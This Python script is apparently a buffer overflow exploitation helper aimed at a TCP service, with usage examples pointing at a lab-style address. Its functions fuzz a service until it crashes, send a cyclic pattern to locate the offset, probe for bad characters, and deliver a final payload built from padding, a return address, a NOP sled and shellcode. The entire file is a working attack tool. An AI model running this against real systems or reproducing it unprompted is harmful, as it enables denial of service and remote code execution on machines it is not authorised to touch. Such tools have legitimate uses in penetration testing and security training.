#!/usr/bin/python
import sys, socket, re
from time import sleep
import argparse
import mimetypes

parser = argparse.ArgumentParser(description='''Script for fuzzing parameters and sending payloads in buffer overflow.
                                 
EXAMPLES:
    fuzz.py 10.10.10.71 9000 "PARAM1 " (Default --fuzz)
    fuzz.py 10.10.10.71 9000 "PARAM1 " --pattern "Aa0Aa1Aa2Aa3Aa4Aa"
    fuzz.py 10.10.10.71 9000 "PARAM1 " --pattern pattern.txt
    fuzz.py 10.10.10.71 9000 "PARAM1 " --offset 2092
    fuzz.py 10.10.10.71 9000 "PARAM1 " --offset 2092 --bad-chars "\\x00\\x07\\x20"
    fuzz.py 10.10.10.71 9000 "PARAM1 " --payload 2092 "\\xAF\\x11\\x50\\x62" "<shell-code | shellcode.txt>"
''', formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('IP', metavar="[IP]", type=str, help='Target IPv4 Address')
parser.add_argument('port', metavar="[port]", type=int, help='Target Port')
parser.add_argument('prefix', metavar="[prefix]", type=str, help='Prefix String')

group = parser.add_mutually_exclusive_group()
group.add_argument('--fuzz', action='store_true', help='Fuzz bytes to crash', default=True)
group.add_argument('--pattern', metavar="", type=str, help='Cyclic pattern generated using pattern_create.rb')
group.add_argument('--offset', metavar="", type=int, help='Offset to inject Bad Characters, range from \\x00 to \\xFF')
group.add_argument('--payload', metavar="", type=str, nargs=3, help='Shellcode payload. 3 parameters - [offset] [memory_address] [shellcode]')

parser.add_argument('--bad-chars', metavar="", type=str, help='Identified Bad Characters')

args = parser.parse_args()

# From \x00 to \xFF
ALL_CHARS = "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

IP = args.IP
PORT = args.port
PREFIX = args.prefix

def pattern(pattern):
    string = ""
    mime = mimetypes.guess_type(pattern)
    if mime[0] == "text/plain":
        filename = pattern
        with open(filename, 'r') as file:
            pattern = file.read()

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3)
            string = PREFIX + pattern
            print("Sending pattern...")
            s.connect((IP, PORT))
            s.recv(1024)
            s.send(bytes(string, "latin-1"))
            s.recv(1024)
    except:
        print("Done...")
    sys.exit(0)

def bad_chars(offset, bad_chars):
    char_bad_removed = ALL_CHARS
    if bad_chars:
        bad_chars = bytes.fromhex(''.join(re.findall(r'[0-9a-fA-F]{2}', bad_chars)))
        for char in bad_chars:
            char_bad_removed = char_bad_removed.replace(chr(char), "")
            
    string = PREFIX + "A" * offset + "B" * 4 + char_bad_removed + "C" * 32

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3)
            print("Sending bad chars...")
            s.connect((IP, PORT))
            s.recv(1024)
            s.send(bytes(string, "latin-1"))
            s.recv(1024)
    except:
        print("Done...")
    sys.exit(0)

def payload(offset, address, payload):
    mime = mimetypes.guess_type(payload)
    if mime[0] == "text/plain":
        filename = payload
        with open(filename, 'r') as file:
            payload = file.read().strip()

    # User inputs are strings, the following convert them to bytes
    tmp0, tmp1 = [address, payload]
    tmp0 = re.findall(r'[0-9a-fA-F]{2}', tmp0)
    tmp1 = re.findall(r'[0-9a-fA-F]{2}', tmp1)

    string = b""
    address = b""
    payload= b""
    offset = int(offset)
    
    for char in tmp0:
        address += bytes.fromhex(char)

    for char in tmp1:
        payload += bytes.fromhex(char)

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3)
            string = PREFIX.encode("latin-1") + b"A" * offset + address + b"\x90" * 32 + payload
            print("Sending payload...")
            s.connect((IP, PORT))
            s.recv(1024)
            s.send(string)
            s.recv(1024)
    except:
        print("Done...")
    sys.exit(0)

def fuzz():
    string = PREFIX + ("A" * 100)
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3)
                s.connect((IP, PORT))
                s.recv(1024)
                print("Fuzzing with {} bytes".format(len(string) - len(PREFIX)))
                s.send(bytes(string, "latin-1"))
                s.recv(1024)
                string += "A" * 100
                sleep(.1)
        except:
            print("Crashed at {} bytes".format(len(string) - len(PREFIX)))
            sys.exit(0)

if args.payload:
    payload(args.payload[0], args.payload[1], args.payload[2])

elif args.pattern:
    pattern(args.pattern)

elif args.offset:
    bad_chars(args.offset, args.bad_chars)

elif args.fuzz:
    fuzz()
